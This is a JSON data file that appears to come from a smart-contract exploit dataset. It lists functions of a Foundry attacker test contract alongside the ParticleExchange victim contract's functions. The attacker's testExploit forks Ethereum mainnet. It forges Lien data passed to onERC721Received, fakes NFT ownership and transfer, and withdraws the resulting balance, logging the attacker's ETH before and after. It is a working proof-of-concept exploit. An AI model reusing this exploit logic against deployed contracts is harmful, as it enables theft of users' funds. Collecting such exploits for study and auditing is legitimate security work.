[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "ownerOf",
    "original_code": "    function ownerOf(\n        uint256 tokenId\n    ) external returns (address owner) {\n        return ownerofaddr;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "safeTransferFrom",
    "original_code": "    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata _data) external {\n        ownerofaddr = address(0);\n        return;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 19_231_445);\n        cheats.label(address(proxy), \"proxy\");\n        cheats.label(address(Azuki), \"Azuki\");\n        cheats.label(address(ParticleExchange), \"ParticleExchange\");\n        cheats.label(address(Reservoir), \"Reservoir\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        payable(zero).transfer(address(this).balance);\n        emit log_named_decimal_uint(\"Attacker Eth balance before attack:\", address(this).balance, 18);\n        uint256 tokenId = 50_126_827_091_960_426_151;\n        uint256 tokenId2 = 19_231_446;\n        (uint256 lienId) = proxy.offerBid(address(this), uint256(0), uint256(0), uint256(0));\n        IParticleExchange.Lien memory lien = IParticleExchange.Lien({\n            lender: zero,\n            borrower: address(this),\n            collection: address(this),\n            tokenId: 0,\n            price: 0,\n            rate: 0,\n            loanStartTime: 0,\n            auctionStartTime: 0\n        });\n        uint256 amount = 0;\n        bytes memory bytecode = (abi.encode(lien, lienId, amount, Reservoir, zero, \"0x\"));\n        proxy.onERC721Received(zero, zero, tokenId, bytecode);\n\n        IParticleExchange.Lien memory lien2 = IParticleExchange.Lien({\n            lender: zero,\n            borrower: address(this),\n            collection: address(this),\n            tokenId: tokenId,\n            price: 0,\n            rate: 0,\n            loanStartTime: block.timestamp,\n            auctionStartTime: 0\n        });\n\n        bytes memory bytecode2 = (abi.encode(lien2, lienId, amount, Reservoir, zero, \"0x\"));\n        ownerofaddr = address(proxy);\n        proxy.onERC721Received(zero, zero, tokenId2, bytecode2);\n\n        proxy.accountBalance(address(this));\n        proxy.withdrawAccountBalance();\n\n        emit log_named_decimal_uint(\"Attacker Eth balance after attack:\", address(this).balance, 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IParticleExchange",
    "source_type": "victim_contract",
    "function_name": "accountBalance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IParticleExchange",
    "source_type": "victim_contract",
    "function_name": "offerBid",
    "original_code": "    function offerBid(\n        address collection,\n        uint256 margin,\n        uint256 price,\n        uint256 rate\n    ) external payable override nonReentrant returns (uint256 lienId) {\n        if (price > _MAX_PRICE || rate > _MAX_RATE) {\n            revert Errors.InvalidParameters();\n        }\n\n        // balance the account for the reest of the margin\n        _balanceAccount(msg.sender, margin, msg.value);\n\n        // create a new lien\n        Lien memory lien = Lien({\n            lender: address(0),\n            borrower: msg.sender,\n            collection: collection,\n            tokenId: margin, /// @dev: use tokenId for margin storage\n            price: price,\n            rate: rate,\n            loanStartTime: 0,\n            auctionStartTime: 0\n        });\n\n        /// @dev Safety: lienId unlikely to overflow by linear increment\n        unchecked {\n            liens[lienId = _nextLienId++] = keccak256(abi.encode(lien));\n        }\n\n        emit OfferBid(lienId, msg.sender, collection, margin, price, rate);\n    }\n\n    /// @inheritdoc IParticleExchange\n",
    "description": ""
  },
  {
    "contract/interface": "IParticleExchange",
    "source_type": "victim_contract",
    "function_name": "onERC721Received",
    "original_code": "    function onERC721Received(address, address, uint256, bytes calldata) external virtual returns (bytes4) {\n        return ERC721TokenReceiver.onERC721Received.selector;\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IParticleExchange",
    "source_type": "victim_contract",
    "function_name": "swapWithEth",
    "original_code": "    function swapWithEth(\n        Lien calldata lien,\n        uint256 lienId\n    ) external payable override validateLien(lien, lienId) nonReentrant {\n        if (lien.loanStartTime != 0) {\n            revert Errors.LoanStarted();\n        }\n\n        if (lien.lender == address(0)) {\n            revert Errors.BidNotTaken();\n        }\n\n        /// @dev: underlying account balancing ensures balance > lien.price - msg.value (i.e., no overspend)\n        _balanceAccount(msg.sender, lien.price, msg.value);\n\n        // update lien\n        liens[lienId] = keccak256(\n            abi.encode(\n                Lien({\n                    lender: lien.lender,\n                    borrower: msg.sender,\n                    collection: lien.collection,\n                    tokenId: lien.tokenId,\n                    price: lien.price,\n                    rate: lien.rate,\n                    loanStartTime: block.timestamp,\n                    auctionStartTime: 0\n                })\n            )\n        );\n\n        // transfer NFT to borrower\n        IERC721(lien.collection).safeTransferFrom(address(this), msg.sender, lien.tokenId);\n\n        emit SwapWithETH(lienId, msg.sender, block.timestamp);\n    }\n\n    /// @inheritdoc IParticleExchange\n",
    "description": ""
  },
  {
    "contract/interface": "IParticleExchange",
    "source_type": "victim_contract",
    "function_name": "withdrawAccountBalance",
    "original_code": "    function withdrawAccountBalance() external override nonReentrant {\n        uint256 balance = accountBalance[msg.sender];\n        if (balance == 0) return;\n\n        accountBalance[msg.sender] = 0;\n        payable(msg.sender).sendValue(balance);\n\n        emit WithdrawAccountBalance(msg.sender, balance);\n    }\n\n",
    "description": ""
  }
]